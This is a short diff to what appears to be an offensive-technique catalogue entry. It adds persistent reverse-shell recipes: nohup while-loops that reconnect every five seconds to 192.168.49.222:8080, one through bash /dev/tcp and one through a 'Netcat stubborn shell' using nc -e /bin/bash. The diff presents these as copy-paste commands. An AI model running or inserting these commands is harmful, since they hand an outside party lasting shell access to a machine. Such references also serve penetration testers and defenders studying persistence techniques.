@@ -24,7 +24,19 @@ functions:
         cat > bashshell.sh <<EOF
         /bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.49.222/8080 0>&1"
         EOF
-        nohup bash -c "while true; do /bin/bash ./bashshell.sh;sleep 5;done &"
+        nohup bash -c "while true; do /bin/bash ./bashshell.sh;sleep 5;done &"  OR
+
+        nohup bash -c "while true; do /bin/bash -i >& /dev/tcp/192.168.49.222/8080 0>&1;sleep 5;done &"
+
+    - description: Netcat stubborn shell
+        copy,paste
+
+        cat > ncshell.sh <<EOF
+        /bin/bash -c "nc 192.168.49.222 8080 -e /bin/bash"
+        EOF
+        nohup bash -c "while true; do /bin/bash ./ncshell.sh;sleep 5;done &"  OR
+
+        nohup bash -c "while true; do nc 192.168.49.222 8080 -e /bin/bash;sleep 5;done &"
 resources: |
   
 ---
